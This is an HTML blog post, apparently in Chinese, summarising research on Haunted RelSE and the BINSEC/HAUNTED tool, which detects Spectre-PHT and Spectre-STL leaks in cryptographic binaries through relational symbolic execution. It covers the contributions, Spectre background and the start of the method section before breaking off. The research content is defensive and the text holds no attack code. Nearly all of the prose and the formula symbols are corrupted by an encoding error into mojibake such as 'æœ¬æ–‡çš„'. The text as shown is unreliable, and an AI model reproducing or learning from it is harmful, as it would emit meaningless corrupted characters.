æœ¬æ–‡çš„å·¥ä½œå±•ç¤ºäº†ä¸€ç§ç”¨äºå¯¹æŠ— Spectre-PHT çš„è‘—åé˜²å¾¡æ‰‹æ®µ index-masking å¯èƒ½ä¼šå¼•å…¥æ–°çš„ Spectre-STL æ¼æ´ï¼Œå¹¶æå‡ºä¸”éªŒè¯äº†ç”¨ä»¥è§£å†³è¿™ä¸ªé—®é¢˜çš„å®‰å…¨å®ç°ï¼Œé€šè¿‡æœ¬æ–‡çš„å·¥å…·è¿˜å‘ç°äº† GCC ä¸­ä¸€ä¸ªæµè¡Œçš„ç”¨ä»¥ç”Ÿæˆä½ç½®æ— å…³ä»£ç ï¼ˆposition-independent codeï¼‰çš„é€‰é¡¹å¯èƒ½å¼•å…¥ Spectre-STL æ¼æ´ï¼ŒåŒæ—¶è¿˜ç¡®è®¤äº†ç”±ç¼–è¯‘å™¨æ·»åŠ çš„æ ˆä¿æŠ¤åœ¨å¯†ç åŸè¯­ï¼ˆcryptographic primitivesï¼‰ä¸­å¼•å…¥äº† Spectre violations</p><p><strong>Contributions.</strong> æ€»ç»“èµ·æ¥æœ¬æ–‡çš„å·¥ä½œå°±æ˜¯ï¼š</p><ul><li>ç ”ç©¶è€…è®¾è®¡äº†ä¸€ç§åŸºäºå…³ç³»ç¬¦å·æ‰§è¡Œçš„æŠ€æœ¯ï¼Œç§°ä¹‹ä¸º <code>Haunted Relse</code>ï¼Œç”¨ä»¥åœ¨ç¬¦å·åˆ†æä¸­é«˜æ•ˆåœ°åˆ†ææ¨æµ‹æ‰§è¡Œï¼Œä»¥æ£€æµ‹ PHT ä¸ STL Spectreï¼ˆSection III &amp; IVï¼‰ï¼›<code>Haunted Relse</code> çš„åŸºæœ¬æ€æƒ³æ˜¯åŒæ—¶åŸºäºå¸¸è§„çš„ä¸ç¬æ€çš„è¡Œä¸ºè¿›è¡Œç¬¦å·åŒ–æ¨æ–­ï¼Œå°½ç®¡ç ”ç©¶è€…å¯¹å†…å­˜çš„ç¼–ç è®©äººè”æƒ³åˆ°ä¸€äº›çŠ¶æ€åˆå¹¶çš„ç¼–ç ï¼Œä½†å®é™…ä¸Šå…¶éµå¾ªäº†ä¸åŒçš„ç†è®ºï¼Œé€šè¿‡é˜²æ­¢å¸¸è§„ä¸ç¬æ€æ‰§è¡Œä¹‹é—´çš„äººå·¥é˜»æ–­ï¼Œè€Œéè¯•å›¾å°†ä¸åŒçš„è·¯å¾„ï¼ˆå¯èƒ½ä¸ç›¸å…³ï¼‰æ‰“åŒ…åœ¨ä¸€èµ·ï¼›ç ”ç©¶è€…æ­£å¼è¯æ˜äº†æ˜¾å¼åœ°å¯¹æ‰€æœ‰çš„æ¨æµ‹è·¯å¾„å»ºæ¨¡è¿›è¡Œå…³ç³»åˆ†æä¸ä½¿ç”¨ Haunted Relse åœ¨è¯­ä¹‰ä¸Šç­‰ä»·ï¼ˆSection IVï¼‰</li><li>ç ”ç©¶è€…æå‡ºäº†ä¸€ç§åä¸º <code>BINSEC/HAUNTED</code> çš„éªŒè¯å·¥å…·ï¼Œå®ç°äº† <code>Haunted Relse</code>ï¼Œå¹¶é€šè¿‡è‘—åçš„ç”¨äº spectre-PHT çš„ litmus test è¿›è¡Œè¯„ä¼°ï¼›ç ”ç©¶è€…è¿˜è¿›ä¸€æ­¥åœ°æå‡ºä¸€ç»„ç”¨äº Spectre-STL çš„ litmus test ä¸”ç”¨å…¶æµ‹è¯•äº† <code>BINSEC/HAUNTED</code>ï¼›è¯•éªŒçš„è¯„ä¼°æ˜¾ç¤ºäº† <code>BINSEC/HAUNTED</code> å¯ä»¥åœ¨å¦‚ OpenSSLã€donnaã€Libsodium è¿™æ ·çš„çœŸå®ä¸–ç•Œçš„å¯†ç å­¦ä»£ç ä¸­å‘ç°æ¨æµ‹å¸¸æ•°æ—¶é—´æ¼æ´ï¼›å¯¹äº Spectre-PHTï¼Œ<code>BINSEC/HAUNTED</code> æœ€å¤šå¯ä»¥åˆ†æ 5k æ¡é™æ€æŒ‡ä»¤ï¼Œå¹¶æ¯”ç°æœ‰æ°´å¹³çš„  KLEESpectre ä¸ Pitchfork æ›´å¿«ï¼ˆä½†ç²¾å‡†åº¦æ›´ä½ï¼‰ï¼›å¯¹äº Spectre-STLï¼Œå…¶å¯ä»¥æœ€å¤šåˆ†æ 100 æ¡æŒ‡ä»¤å¹¶åœ¨é«˜è¾¾ 6k æ¡æŒ‡ä»¤çš„ä»£ç ä¸­æ‰¾åˆ°æ¼æ´ï¼›ç›¸æ¯”äº Pitchforkï¼Œ<code>BINSEC/HAUNTED</code> æ˜æ˜¾æ›´å¿«ï¼Œä¸”èƒ½æ‰¾åˆ°æ›´å¤šçš„æ¼æ´å¹¶æŠ¥å‘Šæ›´å¤šçš„ä¸å®‰å…¨ç¨‹åº</li><li>æ®ç ”ç©¶è€…æ‰€çŸ¥ï¼Œå…¶ç¬¬ä¸€ä¸ªæŠ¥å‘Šäº†è‘—åçš„ç”¨äºå¯¹æŠ— Spectre-PHT çš„é˜²æŠ¤ <code>index-masking</code> æœ‰å¯èƒ½å¼•å…¥ Spectre-STL æ¼æ´ï¼›ç ”ç©¶è€…æå‡ºäº†ç”¨ä»¥ä¿®å¤è¿™ä¸ªé—®é¢˜çš„æ­£ç¡®å®ç°ï¼ˆSection VIï¼‰ï¼Œå¹¶ç”¨å…¶å·¥å…·è¿›è¡Œäº†éªŒè¯ï¼›ç ”ç©¶è€…åŒæ—¶è¿˜ç¬¬ä¸€ä¸ªæŠ¥å‘Šäº† GCC ç¼–è¯‘å™¨çš„ PIC é€‰é¡¹å¼•å…¥äº† Spectre-STL æ¼æ´ï¼ˆSection VIï¼‰</li></ul><p><strong>Discussion.</strong> å½“ Spectre attacks å¼€å¯äº†ç³»ç»Ÿå®‰å…¨çš„æ–°æˆ˜åœºï¼Œå¯¹æ¨æµ‹æ‰§è¡Œçš„æ€è€ƒå˜å¾—å›°éš¾ä¸”å†—é•¿ï¼Œè¿™éœ€è¦è‡ªåŠ¨æœç´¢æŠ€æœ¯ï¼Œä½†ç”±äºé¢å¤–çš„æ¨æµ‹è¡Œä¸ºå¼•èµ·çš„è·¯å¾„çˆ†ç‚¸ï¼Œæ­¤å‰çš„ææ¡ˆéƒ½å­˜åœ¨å¯æ‰©å±•æ€§é—®é¢˜ï¼Œ<code>Haunted RelSE</code> æ˜¯å‘ç€å¯æ‰©å±•çš„å¯¹ Spectre attacks çš„åˆ†æè¿ˆå‡ºçš„ä¸€æ­¥ï¼›å¯¹äº Spectre-PHTï¼ŒHaunted RelSE å¯ä»¥åœ¨ä¸€äº›æƒ…å†µä¸‹æé«˜åˆ†æé€Ÿåº¦ï¼Œå¯¹åˆ†ææ¨æµ‹è¯­ä¹‰çš„å¤æ‚æ€§è¿›è¡Œå‰ªæï¼Œå¹¶ç¼©æ”¾äºä¸­ç­‰å¤§å°çš„çœŸå®ä¸–ç•Œä¸­çš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ï¼›å¯¹äº Spectre-STLï¼Œå…¶ä¸ºç¬¬ä¸€ä¸ªå¯ä»¥å½»åº•åˆ†æå°çš„çœŸå®ä¸–ç•Œå¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶çš„å·¥å…·ï¼Œå¹¶èƒ½åœ¨ä¸­ç­‰å¤§å°çš„çœŸå®ä¸–ç•Œå¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°æ¼æ´</p><h1 id="0x02-BACKGROUND"><a href="#0x02-BACKGROUND" class="headerlink" title="0x02. BACKGROUND"></a>0x02. BACKGROUND</h1><p>æœ¬èŠ‚ç ”ç©¶è€…æä¾›äº†å…³äº Spectre çš„åŸºæœ¬èƒŒæ™¯ï¼šæ¨æµ‹å¸¸æ•°æ—¶é—´ï¼ˆspeculative constant-timeï¼‰ä¸å…³ç³»ç¬¦å·æ‰§è¡Œï¼ˆrelational symbolic executionï¼‰</p><p><strong>Spectre attacks.</strong> åœ¨ç°ä»£å¤„ç†å™¨ä¸­ï¼Œåªè¦æŒ‡ä»¤çš„æ“ä½œæ•°å¯ç”¨ï¼Œå…¶è¢«æŒ‰é¡ºåºè·å–å¹¶å­˜æ”¾åœ¨ä¸€ä¸ª <em>é‡æ’åºç¼“å†²åŒº</em> ï¼ˆreorder bufferï¼‰ä¸­ï¼Œä¸”èƒ½æŒ‰ä»»æ„é¡ºåºæ‰§è¡Œï¼›å¤„ç†å™¨åŒæ—¶ä½¿ç”¨<strong>æ¨æµ‹</strong>ï¼ˆspeculationï¼‰æœºåˆ¶ä»¥åœ¨ç‰¹å®šæŒ‡ä»¤æ‰§è¡Œä¹‹å‰é¢„æµ‹å…¶è¾“å‡ºï¼Œç”±è¯¯åˆ¤å¸¦æ¥çš„æŒ‡ä»¤æµâ€”â€”å³ <em>ç¬æ€æ‰§è¡Œ</em> ï¼ˆtransient executionï¼‰ä¼šè¢«åœ¨æ¶æ„çº§è¿˜åŸï¼ˆä¾‹å¦‚æ¢å¤å¯„å­˜å™¨çš„å€¼ï¼‰ï¼Œä½†è¿™å¯èƒ½é—ç•™å¾®æ¶æ„çº§çš„ä¾§é¢å½±å“ï¼ˆä¾‹å¦‚ cache çš„çŠ¶æ€å¯èƒ½ä¸ä¼šè¢«æ¢å¤ï¼‰ï¼Œè€Œè¿™äº›å¾®æ¶æ„çº§çš„ä¾§é¢å½±å“å¯¹ç¨‹åºæ˜¯é€æ˜çš„ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥è¿›è¡Œä¾§ä¿¡é“æ”»å‡»ï¼Œ<strong>å¹½çµæ”»å‡»</strong>ï¼ˆSpectre attacksï¼‰ ä¾¿æ˜¯åˆ©ç”¨è¿™ç§æ¨æµ‹æœºåˆ¶æ¥è§¦å‘è¿™æ ·çš„ä¼šåœ¨å¾®æ¶æ„çº§å­˜å‚¨ç§˜å¯†æ•°æ®çš„ç¬æ€æ‰§è¡Œâ€”â€”ç§°ä¹‹ä¸º <code>spectre gadgets</code>ï¼Œè¿™å°†è¢«é€šè¿‡ä¾§ä¿¡é“æ”»å‡»è¿›è¡Œå¤åŸ</p><p>å¹½çµæ”»å‡»ä¸€å…±æœ‰å››ç§æ ¹æ®é’ˆå¯¹çš„æœºåˆ¶çš„ä¸åŒå˜ç§ï¼š</p><ul><li><code>Spectre-PHT</code>ï¼šå¯¹ç”¨ä»¥é¢„æµ‹æ¡ä»¶åˆ†æ”¯çš„ <code>Pattern History Table</code> è¿›è¡Œåˆ©ç”¨</li><li><code>Spectre-BHB</code>ï¼šå¯¹ç”¨ä»¥é¢„æµ‹åˆ†æ”¯åœ°å€çš„ <code>Branch Target Buffer </code>è¿›è¡Œåˆ©ç”¨</li><li><code>Spectre-RSB</code>ï¼šå¯¹ç”¨ä»¥é¢„æµ‹è¿”å›åœ°å€çš„ <code>Return Stack Buffer </code>è¿›è¡Œåˆ©ç”¨</li><li><code>Spectre-STL</code>ï¼šå¯¹ç”¨ä»¥é¢„æµ‹ <code>Store-To-Load dependencies</code> çš„æ¶ˆæ­§ä¹‰æœºåˆ¶è¿›è¡Œåˆ©ç”¨</li></ul><p>å¯¹ BTB ä¸ RSB å˜ç§çš„æ¨æµ‹æœºåˆ¶ï¼Œå¯èƒ½ä¼šè¢«è¯¯è®¤ä¸ºä»»æ„åœ°å€è·³è½¬ï¼Œè¿™å¯¹é™æ€åˆ†æè€Œè¨€æ¯”è¾ƒæ£˜æ‰‹ï¼ˆå‚è§ Section VIIï¼‰ï¼Œæ•…ç ”ç©¶è€…ä¸»è¦å…³æ³¨ Spectre-PHT ä¸ Spectre-STL</p><p><strong>Spectre-PHT.</strong> <code>Pattern History Table</code> ç”¨ä»¥åœ¨å¾®æ¶æ„çº§é¢„æµ‹æ¡ä»¶åˆ†æ”¯çš„è¾“å‡ºï¼›æˆ‘ä»¬é¦–å…ˆä»‹ç» Spectre çš„å˜ç§ 1ï¼Œæ”»å‡»è€…æ»¥ç”¨åˆ†æ”¯é¢„æµ‹å™¨ä»¥æ•…æ„åœ¨ä¸€ä¸ªåˆ†æ”¯è¿›è¡Œé”™è¯¯çš„æ¨æµ‹ï¼›å³ä½¿ç¨‹åºä¸­çš„æ¡ä»¶è¯­å¥åœ¨æ¶æ„çº§ç¡®ä¿äº†å†…å­˜è®¿é—®çš„èŒƒå›´å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥å¼•å¯¼ PHT é”™è¯¯é¢„æµ‹ä¸€ä¸ªåˆ†æ”¯çš„å€¼ä»¥ç¬æ€æ‰§è¡Œä¸€ä¸ªè¶Šç•Œå†…å­˜è®¿é—®ï¼Œè¿™åœ¨ç¼“å­˜ä¸­ç•™ä¸‹å¯ä»¥è¢«è§‚æµ‹åˆ°çš„ä¸”èƒ½è¢«ç”¨ä»¥æ¢å¤è¶Šç•Œè¯»çš„æ•°æ®çš„å½±å“ï¼ˆListing 1ï¼‰</p><p><img src="https://s2.loli.net/2023/01/25/WZD6Vx1YTv3koiG.png" alt="Listing 1: Illustration of a Spectre-PHT attack."></p><p><strong>Spectre-STL.</strong> <code>Store-To-Load dependencies</code> éœ€è¦åœ¨æ‰€æœ‰çš„ store æŒ‡ä»¤å®Œæˆæ‰§è¡Œå‰ load æŒ‡ä»¤ä¸ä¼šæ‰§è¡Œï¼Œä¸ºäº†è®© CPU ç¬æ€æ‰§è¡Œ store æŒ‡ä»¤å¹¶é¿å…ç¼“å­˜æœªå‘½ä¸­å¯¼è‡´çš„æš‚åœï¼Œstore æŒ‡ä»¤ä»¥é˜Ÿåˆ—å½¢å¼å­˜æ”¾åœ¨ä¸€ä¸ª <code>store buffer</code> ä¸­ï¼Œè€Œç›¸è¾ƒäºç­‰å¾…å…ˆå‰çš„ store æŒ‡ä»¤å®Œæˆï¼Œload æŒ‡ä»¤å¯ä»¥ç›´æ¥ä»åŒ¹é…çš„å¸¦æœ‰ <em>store-to-load forwarding</em> çš„ <code>store buffer </code> ä¸­å–å€¼ï¼›æ­¤å¤–ï¼Œå½“å†…å­˜æ¶ˆæ­§ä¹‰å™¨ï¼ˆmemory disambiguatorï¼‰é¢„æµ‹åˆ°ä¸€ä¸ª loadæŒ‡ä»¤å¹¶éç­‰å¾…ä¸­çš„ store çš„åˆ«åï¼Œå…¶å¯ä»¥ <em>æ¨æµ‹æ€§åœ°ç»•è¿‡åœ¨ store buffer ä¸­ç­‰å¾…ä¸­çš„ store</em> å¹¶ç›´æ¥ä»ä¸»å­˜å–å€¼ï¼›Spectre-STL åˆ©ç”¨è¿™ç§è¡Œä¸ºæ¥è½½å…¥ä¼šè¢«ç¼–ç äºç¼“å­˜ä¸­çš„åŒ…å«ç§˜å¯†æ•°æ®çš„æ—§å€¼ï¼ˆListing 2ï¼‰</p><p><img src="https://s2.loli.net/2023/01/25/r7wLWqOlckJHzbK.png" alt="Listing 2: Illustration of a Spectre-STL attack."></p><p><strong>Speculative constant-time</strong>ï¼ˆSCTï¼‰. å¸¸æ•°æ—¶é—´ï¼ˆconstant timeï¼‰æ˜¯å¯†ç å­¦ä»£ç ä¸­ä¸€ä¸ªæµè¡Œçš„ç¼–ç¨‹è§„èŒƒï¼šç¨‹åºä¸ä¼šå­˜å‚¨ã€è£…è½½ç§˜å¯†æ•°æ®å€¼æˆ–æ˜¯ä»¥å…¶è¿›è¡Œåˆ†æ”¯ï¼Œä»¥é¿å…ä¾§ä¿¡é“æ•°æ®æ³„éœ²ï¼›ç„¶è€Œå¸¸æ•°æ—¶é—´å¹¶ä¸è¶³ä»¥é¢„é˜²å¹½çµæ”»å‡»ï¼Œå¦‚ Listing 1 ä¸ºä¸€ä¸ªå¸¸è§„çš„æ²¡æœ‰å¯¹ç§˜å¯†æ•°æ®çš„è®¿é—®æˆ–ä»¥å…¶åˆ†æ”¯çš„å¸¸æ•°æ—¶é—´ç¨‹åºï¼Œä½†è¯¥ç¨‹åºå­˜åœ¨ Spectre-PHT æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¯¯å¯¼å¼è®­ç»ƒåˆ†æ”¯é¢„æµ‹å™¨å¹¶åœ¨ç¬æ€æ‰§è¡Œä¸­æ³„éœ²ç§˜å¯†æ•°æ®ï¼›æ¨æµ‹å¸¸æ•°æ—¶é—´æ˜¯æœ€è¿‘çš„ä¸€ä¸ªæ‰©å±•å¸¸æ•°æ—¶é—´ä»¥è€ƒè™‘ç¬æ€æ‰§è¡Œçš„å®‰å…¨å±æ€§</p><p><strong>Definition 1</strong>ï¼ˆSpeculative constant-timeï¼‰. å½“ä¸”ä»…å½“ä¸€ä¸ªç¨‹åºçš„æ¯ä¸€å¯¹ï¼ˆæ¨æµ‹ï¼‰æ‰§è¡Œæœ‰ç€ç›¸åŒçš„å…¬å…±è¾“å…¥å¹¶åå®šäº†æ¨æµ‹å†³ç­–ã€ä¸”äº’ç›¸çš„æ§åˆ¶æµä¸å†…å­˜è®¿é—®éƒ½ç›¸ç­‰æ—¶ï¼Œè¯¥ç¨‹åºå…³äºæ¨æµ‹å¸¸æ•°æ—¶é—´æ˜¯å®‰å…¨çš„ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ SCTï¼ˆç±»ä¼¼äºå¸¸æ•°æ—¶é—´ä¸å…¶ä»–ä¿¡æ¯æµå±æ€§ï¼‰å¹¶éä¸€ä¸ªæ‰§è¡Œè½¨è¿¹çš„å±æ€§ï¼Œè€Œä¸ä¸¤ä¸ªæ‰§è¡Œè½¨è¿¹ç›¸å…³è”ï¼Œå› æ­¤éœ€è¦è¿‘ä¼¼å·¥å…·ä»¥é«˜æ•ˆåœ°å»ºæ¨¡è½¨è¿¹å¯¹</p><p><strong>Binary-level symbolic execution.</strong> ç¬¦å·æ‰§è¡Œï¼ˆSymbolic Executionï¼‰å³ä½¿ç”¨ç¬¦å·è¾“å…¥æ‰§è¡Œç¨‹åºï¼Œå…¶ä¼šæ„å»ºä¸€ä¸ªç§°ä¸º <em>è·¯å¾„è°“è¯­</em> ï¼ˆpath predicateï¼‰çš„é€»è¾‘è¡¨è¾¾å¼ï¼Œç”¨ä»¥ä¿å­˜åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°çš„åˆ†æ”¯æ¡ä»¶ï¼›ä¸ºäº†ç¡®è®¤ä¸€æ¡è·¯å¾„æ˜¯å¦èƒ½é€šï¼Œè·¯å¾„è°“è¯­ä¼šè¢«äº¤ç»™å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨ï¼ˆSMT solverï¼‰è¿›è¡Œæ±‚è§£ï¼›ç¬¦å·æ‰§è¡ŒåŒæ—¶è¿˜èƒ½æ£€æŸ¥æ–­è¨€ä»¥å¯»æ‰¾æ¼æ´æˆ–æ˜¯è¿›è¡Œæœ‰ç•ŒéªŒè¯ï¼ˆå³ï¼Œåœ¨ä¸€ä¸ªç¡®å®šçš„æ·±åº¦ä¸‹è¿›è¡ŒéªŒè¯ï¼‰</p><p>åˆ†æäºŒè¿›åˆ¶ä»£ç é€šå¸¸é‡‡ç”¨å°†ä»£ç æŒ‡ä»¤è§£ç ä¸ºä¸€ç§ä½çº§çš„ä¸­é—´è¯­è¨€çš„å½¢å¼ï¼Œåœ¨äºŒè¿›åˆ¶çº§çš„ç¬¦å·æ‰§è¡Œä¸­çš„å€¼ï¼ˆå¦‚å¯„å­˜å™¨ã€å†…å­˜åœ°å€ã€å†…å­˜å†…å®¹ç­‰ï¼‰ä¸ºå›ºå®šå¤§å°çš„ç¬¦å·ä½å‘é‡ï¼Œå†…å­˜è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªç”¨ 32 ä½çš„ä½å‘é‡è¡¨ç¤ºåœ°å€çš„ç¬¦å·å­—èŠ‚æ•°ç»„ï¼Œä¸€ä¸ªç¬¦å·æ•°ç»„ä¸ºä¸€ä¸ªé€šè¿‡å¦‚ä¸‹æ“ä½œå°†æ¯ä¸ªä¸‹æ ‡ <code>i âˆˆ I</code> æ˜ å°„åˆ°å¯¹åº”å€¼ <code>v âˆˆ V</code> çš„å‡½æ•°ï¼ˆ<code>Array I V</code>ï¼‰ï¼š</p><ul><li><code>select</code>ï¼š<code>(Array I V) Ã— I â†’ V</code> è·å–ä¸€ä¸ªæ•°ç»„ <code>a</code> ä¸ä¸€ä¸ªä¸‹æ ‡ <code>i</code>ï¼Œè¿”å›ä¸€ä¸ªå­˜å‚¨åœ¨æ•°ç»„ <code>a</code> çš„ä¸‹æ ‡ <code>i</code> çš„å€¼ <code>v</code></li><li><code>store</code>ï¼š<code>(Array I V) Ã— I Ã— V â†’ (Array I V)</code>  è·å–ä¸€ä¸ªæ•°ç»„ <code>a</code> ã€ä¸€ä¸ªä¸‹æ ‡ <code>i</code> ä¸ä¸€ä¸ªå€¼ <code>v</code>ï¼Œè¿”å›å°†ä¸‹æ ‡ <code>i</code> æ˜ å°„åˆ°å€¼ <code>v</code> çš„æ•°ç»„ <code>a</code></li></ul><p><strong>Relational Symbolic Execution.</strong> <code>å…³ç³»ç¬¦å·æ‰§è¡Œ</code>ï¼ˆRelSEï¼‰æ˜¯ä¸€ç§æœ‰å‰æ™¯çš„å°†ç¬¦å·æ‰§è¡Œè¿›è¡Œæ‰©å±•ä»¥åˆ†æå¦‚ SCT è¿™æ ·çš„ä¸¤ä¸ªæ‰§è¡Œè·¯å¾„çš„å®‰å…¨å±æ€§çš„æ–¹æ³•ï¼Œå…¶ç¬¦å·åŒ–åœ°åœ¨ç›¸åŒçš„ç¬¦å·æ‰§è¡Œå®ä¾‹ä¸­æ‰§è¡Œä¸€ä¸ªç¨‹åºçš„ä¸¤ä¸ªç‰ˆæœ¬å¹¶åœ¨å…¶ä¹‹é—´æœ€å¤§åŒ–å…±æœ‰éƒ¨åˆ†ï¼›ä»¥åˆ†æå¸¸æ•°æ—¶é—´ä¸ºä¾‹ï¼ŒRelSE è®©ä¸¤ä¸ªç¨‹åº <em>å…±äº«ç›¸åŒçš„å…¬æœ‰è¾“å…¥</em> ï¼ˆpublic inputï¼‰ï¼Œä½†ä½¿ç”¨ä¸åŒçš„ <em>ç§˜å¯†è¾“å…¥</em>  ï¼ˆsecret inputï¼‰ï¼Œå¹¶åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ£€æŸ¥æ˜¯å¦æ¡ä»¶åˆ†æ”¯çš„è¾“å‡ºä¸å†…å­˜ä¸‹æ ‡åœ¨ä¸¤ä¸ªæ‰§è¡Œä¸­å¿…é¡»ä¸€è‡´â€”â€”è¿™ä»£è¡¨å…¶æ˜¯å¦å†³å®šäºç§˜å¯†</p><p>åœ¨ RelSE ä¸­ï¼Œå˜é‡è¢«æ˜ å°„åˆ° <em>å…³ç³»è¡¨è¾¾å¼</em> ï¼ˆrelational expressionï¼‰ä¸­ï¼Œå½“å…¶å¯èƒ½ä¾èµ–äºç§˜å¯†æ•°æ®æ—¶ï¼Œå…¶ä¸ºä¸€å¯¹ç¬¦å·è¡¨è¾¾å¼ï¼ˆè¡¨ç¤ºä¸º <code>&lt;Ï•l | Ï•r&gt;</code> ï¼‰ï¼Œå¦åˆ™ä¸ºä¸€ä¸ªç®€å•çš„ç¬¦å·è¡¨è¾¾å¼ï¼ˆè¡¨ç¤ºä¸º <code>&lt;Ï•&gt;</code> ï¼‰ï¼›ä¸ºäº†å¯¹å†…å­˜è®¿é—®ä¸æ¡ä»¶æŒ‡ä»¤è¿›è¡Œå®‰å…¨è¯„ä¼°ï¼Œç ”ç©¶è€…ä½¿ç”¨å¦‚ä¸‹å®šä¹‰çš„å‡½æ•° <code>secLeak</code> ä»¥ç¡®ä¿ä¸€ä¸ªå…³ç³»è¡¨è¾¾å¼å¹¶ä¸å†³å®šäºç§˜å¯†ï¼ˆå³ï¼Œè¡¨è¾¾å¼å·¦å³å†…å®¹å¿…é¡»ç›¸ç­‰ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2023/01/27/mAty1adqCrk49UV.png" alt="image.png"></p><p><code>|=</code> è¡¨ç¤ºå¯æ»¡è¶³ï¼ˆåä¹‹è¡¨ç¤ºä¸æ»¡è¶³ï¼‰ï¼Œå…¶ä¾èµ–äºè¿™æ ·ä¸€ä¸ªäº‹å®ï¼šè‹¥ $\widehat{\varphi}$ ä¸ºä¸€ä¸ªç®€å•çš„è¡¨è¾¾å¼ï¼Œå‚ç…§å®šä¹‰ï¼Œå…¶å¹¶ä¸ä¾èµ–äºç§˜å¯†ï¼Œå› è€Œå¯ä»¥è¢«å®‰å…¨åœ°æ³„éœ²ï¼›ç„¶è€Œè‹¥ $\widehat{\varphi}$  ä¸ºä¸€å¯¹è¡¨è¾¾å¼  <code>&lt;Ï•l | Ï•r&gt;</code> ï¼Œä»…å½“ <code>Ï•l</code> ä¸ <code>Ï•r</code> åœ¨å½“å‰è·¯å¾„è°“è¯­ <code>Ï€</code> ä¸‹ä¸å¯è¢«ç¡®è®¤æ—¶ï¼ˆå³è¡¨è¾¾å¼ <code>Ï€ âˆ§ Ï•l â‰  Ï•r</code> ä¸å¯è¢«æ»¡è¶³ï¼‰ï¼Œæ³„éœ²æ‰æ˜¯å®‰å…¨çš„</p><p><strong>Notations.</strong> å¤§å°ä¸º <code>n</code> çš„ç¬¦å·ä½å‘é‡çš„é›†åˆè¡¨ç¤ºä¸º <em>Bv<sub>n</sub></em> ï¼Œç¬¦å·è¡¨è¾¾å¼ï¼ˆä½å‘é‡æˆ–æ•°ç»„ï¼‰  <em>Ï•, Ï•l , Ï•r, Ïˆ, . . .</em>  çš„é›†åˆè¡¨ç¤ºä¸º <code>Î¦</code> ï¼Œå…³ç³»è¡¨è¾¾å¼ $\widehat{\varphi}$ï¼Œ$\widehat{\psi}$, . . . çš„é›†åˆè¡¨ç¤ºä¸º <strong>Î¦</strong> ï¼Œ $\widehat{\varphi}$ å·¦ã€å³çš„å€¼è¡¨ç¤ºä¸º  $\widehat{\varphi _{|l}}$ ã€$\widehat{\varphi _{|r}}$ ï¼Œè‹¥$\widehat{\varphi} &#x3D; \langle \varphi \rangle$ ï¼Œåˆ™  $\widehat{\varphi _{|l}}$ ã€$\widehat{\varphi _{|r}}$ éƒ½è¢«å®šä¹‰ä¸º  $\widehat{\varphi}$ ï¼Œç¬¦å·æ•°ç»„ä¸Šçš„å‡½æ•° <code>select</code> ä¸ <code>store</code> çš„å…³ç³»è¡¨è¾¾å¼ä¸ºï¼š</p><p><img src="https://s2.loli.net/2023/01/27/HVZc2jtCybDEUQh.png" alt="image.png"></p><h1 id="0x03-HAUNTED-RELSE"><a href="#0x03-HAUNTED-RELSE" class="headerlink" title="0x03. HAUNTED RELSE"></a>0x03. HAUNTED RELSE</h1><p>ä¸ºäº†åˆ†æ SCTï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ RelSE ä»¥è€ƒè™‘ç¨‹åºçš„æ¨æµ‹è¯­ä¹‰ï¼ˆspeculative semanticsï¼‰ï¼Œè¿™åŒ…æ‹¬ <em>å¸¸è§„è¡¨è¾¾å¼</em> â€”â€”è¢«ä½œä¸ºä¸€ä¸ªå¥½çš„æ¨æµ‹ç»“æœè€Œæ‰§è¡Œçš„ä¸”ä¼šåœ¨æ¨æµ‹è¢«è§£å†³æ—¶ä¿å­˜çš„æŒ‡ä»¤â€”â€”ä»¥åŠæ‰€æœ‰å¯èƒ½çš„ <em>ç¬æ€æ‰§è¡Œ</em> â€”â€”è¢«ä½œä¸ºè¯¯æµ‹ä¸”ä¼šåœ¨æ¨æµ‹è§£å†³æ—¶è¢«ä¸¢å¼ƒçš„æŒ‡ä»¤ï¼›æœ¬èŠ‚æè¿°è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•â€”â€”åœ¨æœ€æ–°çš„å·¥å…·ä¸­ä½¿ç”¨ï¼ˆå‚è§ Table Vï¼‰â€”â€”ç ”ç©¶è€…ç§°ä¹‹ä¸º <em>Explicit</em> ï¼Œå› ä¸ºå…¶ç›´æ¥å»ºæ¨¡äº†ç¬æ€æ‰§è¡Œï¼Œå¹¶å±•ç°äº†ç ”ç©¶è€…çš„ä¼˜åŒ–æ¢ç´¢ç­–ç•¥ï¼Œç§°ä¹‹ä¸º <em>Haunted</em></p><h3 id="A-Spectre-PHT"><a href="#A-Spectre-PHT" class="headerlink" title="A. Spectre-PHT"></a>A. Spectre-PHT</h3><p><em>1ï¼‰Explicit RelSE for Spectre-PHT</em> ï¼š <em>Explicit</em> å°è¯•é€šè¿‡ç¬¦å·æ‰§è¡Œå»ºæ¨¡ Spectre-PHTâ€”â€”äº KLEESpectre ä¸­å¼•å…¥â€”â€”é€šè¿‡å°†æ¯ä¸ªæ¡ä»¶åˆ†æ”¯åˆ†æˆå››ä¸ªè·¯å¾„æ¥ç›´æ¥åœ°å»ºæ¨¡äº†ç¬æ€æ‰§è¡Œï¼›ä¾‹å¦‚ <code>Fig.1a</code> ä¸­çš„ç¨‹åºä¸ <code>Fig.1b</code> ä¸­çš„è¯¥ç¨‹åºçš„ç¬¦å·æ‰§è¡Œæ ‘ï¼Œåœ¨æ¡ä»¶æŒ‡ä»¤ <strong>if</strong> <code>c1</code> åï¼Œæ‰§è¡Œå°†åˆ†æˆå››ä¸ªè·¯å¾„ï¼š</p><ul><li>ä¸¤ä¸ª <em>å¸¸è§„è·¯å¾„</em> ï¼ˆregular pathï¼‰ï¼šå¦‚åŒæ ‡å‡†ç¬¦å·æ‰§è¡Œä¸€èˆ¬ï¼Œç¬¬ä¸€ä¸ªè·¯å¾„è·Ÿç€ <code>then</code> åˆ†æ”¯å¹¶å°†çº¦æŸ <code>(c1 == true)</code> æ·»åŠ 